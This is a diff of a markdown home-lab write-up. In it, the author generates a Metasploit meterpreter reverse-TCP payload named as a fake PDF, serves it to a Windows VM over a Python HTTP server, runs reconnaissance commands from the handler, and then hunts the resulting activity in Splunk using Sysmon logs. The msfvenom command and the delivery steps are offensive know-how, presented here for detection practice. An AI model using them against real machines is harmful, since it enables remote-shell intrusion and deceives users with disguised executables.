@@ -37,7 +37,7 @@ Installing Sysmon will enhance our ability to capture system events.(Since I don
 For Splunk configuration, I installed the Sysmon add-on and created the "endpoint" index. Our Sysmon config file will point to the index we created by its name, allowing Sysmon to send logs to our Splunk instance
 
 
-<h3>Kali Setup</h3>
+<h3>Weaponization</h3>
   
   To create telemetry from our Kali VM to our Windows VM, we are going to use the well-known Metasploit pentesting tool.
 We will start by creating the Malware payload with this command: msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.33.3 -f exe Quarterlyreport.pdf.exe
@@ -47,9 +47,11 @@ We will start by creating the Malware payload with this command: msfvenom -p win
 
 ![Screenshot 2025-03-12 072905](https://github.com/user-attachments/assets/17e8deb8-90ab-4509-b982-a718275314f4)
 
+<h3>Delivery/Installation</h3>
+
 Now we need to deliver the payload to the end user.
 To do so, we will host an HTTP Python server by running the command found below inside the directory where the payload was saved to
-python3 -m http.server 9999 
+python3 -m http.server 9999. 
 On our Windows machine we will search the IP of our Kali box followed by ":9999" which is the port designated in our Python command 
 
 ![executing the file](https://github.com/user-attachments/assets/b5601151-d80e-4cca-9425-6304a0f62d4e)
@@ -58,20 +60,22 @@ After searching this, it will take us to the directory in our Kali VM. We will t
 We see on our Kali terminal that a GET request was logged
 After running "netstat -anob" on the Windows VM we see a network connection established to our Kali box 
 
-ran multi/handler on msf exploit 
+
 Now that we have successfully delivered and installed our malware, it's time to carry out the exploitation phase of our attack.
-We do this by opening the msfconsole on our Kali VM and configuring the handler by setting the payload to "windows/x64/meterpreter/reverse_tcp" and setting our local IP and the port we want the exploit to use on the victim machine
-After configuring the handler, we insert the exploit into the CLI to initiate the reverse TCP handler
-The session has been opened with our victim machine
+We do this by opening the msfconsole on our Kali VM and configuring the handler by setting the payload to "windows/x64/meterpreter/reverse_tcp" and setting our local IP and the port we want the exploit to use on the victim machine.
+After configuring the handler, we insert the exploit into the CLI to initiate the reverse TCP handler.
+The session has been opened with our victim machine.
 
 ![Updated handler](https://github.com/user-attachments/assets/1106b392-a05b-4a9f-a284-8d72a3783490)
 
-Now we will run the following commands to open up a shell and create network traffic to analyze in our Splunk instance
-shell, netstat, ipconfig, net user, net group
+Now we will run the following commands in our handler to open up a shell and create network traffic to analyze in our Splunk instance.
+Commands: shell, netstat, ipconfig, net user, net group.
 
-Time to do some threat hunting in our Splunk instance
-We will start by searching for our index indicated in our configuration files for Sysmon "endpoint"
-I have a suspicion that the 192.168.33.3 IP we are sending traffic to is a threat, let's filter traffic that is being sent to that IP 
+<h3>Log Analysis</h3>
+
+Time to do some threat hunting in our Splunk instance.
+We will start by searching for our index in Splunk.
+I have a suspicion that the 192.168.33.3 IP we are sending traffic to is a threat, let's filter traffic that is being sent to that IP.
 
 ![Screenshot 2025-03-10 211850](https://github.com/user-attachments/assets/63eb2f00-f37e-44f8-a4ad-3107ed305bd4)
 
@@ -86,5 +90,5 @@ We queried the SourceProcessGUID and organized the output with the table command
 
 Upon analysis, we see commands being executed affiliated with an IP that is not the host's, sound the alarms.
 In a real life scenario, this endpoint would be immediately quarantined from the rest of the network to mitigate damage from spreading.
-The IP would also be blacklisted and the firewall reconfigured to prevent this suspected RAT from accessing the network again.
+The IP would also be blacklisted and the firewall reconfigured to block this suspected RAT throughout the network.
 
